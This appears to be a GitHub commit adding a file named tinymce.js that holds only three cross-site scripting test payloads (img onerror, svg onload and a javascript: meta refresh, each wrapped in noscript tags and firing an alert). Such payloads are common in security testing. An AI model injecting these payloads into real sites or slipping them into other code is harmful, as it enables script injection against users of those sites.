e663d78e9b1360b7f07fb01638b198b217b45177
gaze11e <117212620+gaze11e@users.noreply.github.com>
2024-06-26 10:07:47 -0400

    Add files via upload

---
+++ tinymce.js
@@ -0,0 +1,3 @@
+<noscript><img src="x" onerror="alert('XSS')"></noscript>
+<noscript><svg onload=alert('XSS')></noscript>
+<noscript><meta http-equiv="refresh" content="0;url=javascript:alert('XSS')"></noscript>
